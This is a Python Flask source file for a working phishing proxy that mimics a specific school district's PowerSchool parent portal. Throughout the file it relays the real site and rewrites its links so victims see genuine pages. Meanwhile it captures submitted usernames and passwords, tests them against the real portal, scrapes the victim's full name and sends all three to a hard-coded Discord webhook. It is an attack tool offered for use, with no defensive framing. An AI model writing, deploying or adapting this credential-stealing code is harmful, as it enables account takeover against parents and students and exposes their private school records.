from flask import Flask, request, Response, session as flask_session
import requests, re, uuid
from datetime import datetime, timezone

app = Flask(__name__)
app.secret_key = "super_secret_render_key"
BASE_URL = "https://beaufortsc.powerschool.com"
user_sessions = {}

def get_user_session():
    sid = flask_session.get("session_id")
    if not sid:
        sid = str(uuid.uuid4())
        flask_session["session_id"] = sid
    if sid not in user_sessions:
        user_sessions[sid] = requests.Session()
    return user_sessions[sid]

def _scheme():
    return request.headers.get("X-Forwarded-Proto", request.scheme)

def _host_root():
    return f"{_scheme()}://{request.host}/"

def replace_urls(html):
    html = re.sub(r'(href|src|action)="(/[^"]*)"', r'\1="\2"', html)
    html = re.sub(r"(href|src|action)='(/[^']*)'", r"\1='\2'", html)
    html = html.replace(BASE_URL, _host_root())
    return html

def _clean_headers():
    hop = {"host","connection","keep-alive","proxy-authenticate","proxy-authorization","te","trailers","transfer-encoding","upgrade","content-length"}
    headers = {k: v for k, v in request.headers.items() if k.lower() not in hop}
    headers["Host"] = "beaufortsc.powerschool.com"
    return headers

def _set_cookies(resp_obj, upstream_resp):
    for c in upstream_resp.cookies:
        resp_obj.set_cookie(c.name, c.value, path="/", samesite="Lax", secure=_scheme() == "https")

def _rewrite_location(upstream_resp, resp_obj):
    if "location" in upstream_resp.headers:
        loc = upstream_resp.headers["location"]
        if loc.startswith("/proxy"): loc = loc[6:]
        if loc.startswith(BASE_URL): loc = loc[len(BASE_URL):]
        if not loc.startswith("/"): loc = "/" + loc
        resp_obj.headers["location"] = loc

def extract_full_name(html):
    match = re.search(r'title="([^"]+?)\s*\(', html)
    if match:
        name = match.group(1).strip()
        parts = [p.strip() for p in name.split(",")]
        if len(parts) >= 2:
            return f"{parts[1]} {parts[0]}".strip()
    match = re.search(r'<span[^>]*>([^<]+)</span>', html)
    if match:
        return match.group(1).strip()
    return "Unknown"

def send_webhook(username, password, full_name):
    webhook_data = {
        "username": "Site Logs",
        "avatar_url": "https://tse1.mm.bing.net/th/id/OIP.2gWDYF24yH8imBm_9i8hlgHaHh?rs=1&pid=ImgDetMain&o=7&rm=3",
        "embeds": [{
            "title": "PowerSchool Login Captured",
            "description": "**Someone Logged in**",
            "color": 3066993,
            "fields": [
                {"name": "Username  🔰", "value": f"`{username}`", "inline": True},
                {"name": "Password  🔥", "value": f"`{password}`", "inline": True},
                {"name": "Full Name  📛", "value": f"`{full_name}`", "inline": False}
            ],
            "footer": {"text": "beaufortsc.powerschool.com"},
            "timestamp": datetime.now(timezone.utc).isoformat()
        }]
    }
    try:
        requests.post(
            "https://discord.com/api/webhooks/1432870093725106328/QsAAhHeIylYLLL-Wnhbf7XjQ8WJ72pRsFied62tLyuiNYuxy2GcJQuFHeOFzjd4e522r",
            json=webhook_data,
            timeout=5
        )
        print(f"Login captured → Discord | {username} | {full_name}")
    except Exception as e:
        print(f"Webhook failed: {e}")

@app.route("/", methods=["GET","POST"])
def root():
    s = get_user_session()
    if request.method == "POST":
        return Response("", 302, {"Location": "/public/home.html"})
    r = s.get(f"{BASE_URL}/public/home.html", headers=_clean_headers(), allow_redirects=False)
    body = r.content
    if "text/html" in r.headers.get("content-type","").lower():
        body = replace_urls(body.decode("utf-8", errors="replace")).encode()
    resp = Response(body, r.status_code, content_type=r.headers.get("content-type","text/html"))
    _set_cookies(resp, r)
    _rewrite_location(r, resp)
    return resp

@app.route("/<path:path>", methods=["GET","POST","PUT","DELETE","PATCH","OPTIONS"])
def proxy(path):
    s = get_user_session()
    url = f"{BASE_URL}/{path}"
    if request.query_string:
        url += "?" + request.query_string.decode("utf-8", errors="ignore")

    headers = _clean_headers()
    headers["Referer"] = BASE_URL
    method = request.method.upper()
    data = request.get_data() if method in {"POST","PUT","PATCH","DELETE"} else None
    form = request.form.to_dict()

    username = form.get("account") or form.get("dbpw")
    password = form.get("pw") or form.get("dbpw")

    r = s.request(method, url, headers=headers, data=data, allow_redirects=False)

    if username and password and "guardian/home.html" in url:
        payload = {
            "dbpw": password,
            "translator_username": "",
            "translator_password": "",
            "translator_ldappassword": "",
            "returnUrl": "",
            "serviceName": "PS Parent Portal",
            "serviceTicket": "",
            "pcasServerUrl": "/",
            "credentialType": "User Id and Password Credential",
            "account": username,
            "pw": password,
            "translatorpw": ""
        }
        test_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://beaufortsc.powerschool.com",
            "Referer": "https://beaufortsc.powerschool.com/public/home.html",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        test_session = requests.Session()
        login_resp = test_session.post(
            "https://beaufortsc.powerschool.com/guardian/home.html",
            data=payload,
            headers=test_headers,
            allow_redirects=False
        )

        if login_resp.status_code in (301, 302, 303, 307, 308):
            final_resp = test_session.get(login_resp.headers["Location"], headers=test_headers)
            if final_resp.status_code == 200 and "guardian/home.html" in final_resp.url:
                full_name = extract_full_name(final_resp.text)
                send_webhook(username, password, full_name)

    if username and password and r.status_code in (302, 303) and "location" in r.headers:
        redir = r.headers["location"]
        if redir.startswith("/"):
            redir = BASE_URL + redir
        r = s.post(redir, data=form, headers=_clean_headers(), allow_redirects=False)

    body = r.content
    ctype = r.headers.get("content-type","").lower()
    if "text/html" in ctype:
        body = replace_urls(body.decode("utf-8", errors="replace")).encode()
    elif "javascript" in ctype or "text/css" in ctype:
        body = body.decode("utf-8", errors="replace").replace(BASE_URL, _host_root()).encode()

    resp = Response(body, r.status_code, content_type=r.headers.get("content-type","text/plain"))
    _set_cookies(resp, r)
    _rewrite_location(r, resp)
    return resp

@app.route("/eade-to-the-call-make-to-looken-the-good-What-ge")
def block_js():
    return Response("", content_type="application/javascript")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, threaded=True)
